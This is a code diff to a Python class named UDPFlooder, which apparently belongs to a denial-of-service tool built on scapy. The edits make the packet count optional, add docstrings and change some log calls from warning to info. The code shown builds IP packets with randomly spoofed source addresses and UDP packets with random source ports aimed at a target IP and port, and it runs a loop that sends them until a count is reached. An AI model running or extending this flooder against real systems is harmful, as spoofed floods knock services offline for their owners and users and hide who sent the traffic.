@@ -39,7 +39,7 @@ _LOGGER = logging.getLogger(__name__)
 class UDPFlooder:  # pylint: disable=R0903
     """A class that represents a UDP flood attack"""
 
-    def __init__(self, dst_ip, dst_port, count):
+    def __init__(self, dst_ip, dst_port, count=None):
         """
         Initialaze a UDP flood object
 
@@ -81,14 +81,22 @@ class UDPFlooder:  # pylint: disable=R0903
         )
 
     def _create_ip_packet(self):
-        """Create an IP packet with random source IP"""
+        """
+        Create an IP packet with random source IP
+
+        :return: scapy IP object
+        """
         IP_Packet = IP()  # pylint: disable=C0103
         IP_Packet.src = random_IP()
         IP_Packet.dst = self.dst_ip
         return IP_Packet
 
     def _create_udp_packet(self):
-        """Create a UDP packet with random source port"""
+        """
+        Create a UDP packet with random source port
+
+        :return: scapy UDP packet
+        """
         UDP_Packet = UDP()  # pylint: disable=C0103
         UDP_Packet.sport = random_port()
         UDP_Packet.dport = self.dst_port
@@ -100,7 +108,7 @@ class UDPFlooder:  # pylint: disable=R0903
         or the number of all packets is sent
         """
         total = 0
-        _LOGGER.warning(
+        _LOGGER.info(
             "Trying to send %i packets. Press Ctrl+C to "
             "stop before all the packets will be sent",
             self.count,
@@ -128,4 +136,4 @@ class UDPFlooder:  # pylint: disable=R0903
                 sys.exit(0)
 
         progress_bar(self.count, self.count)
-        _LOGGER.warning("\nTotal packets sent: %i\n", total)
+        _LOGGER.info("\nTotal packets sent: %i\n", total)
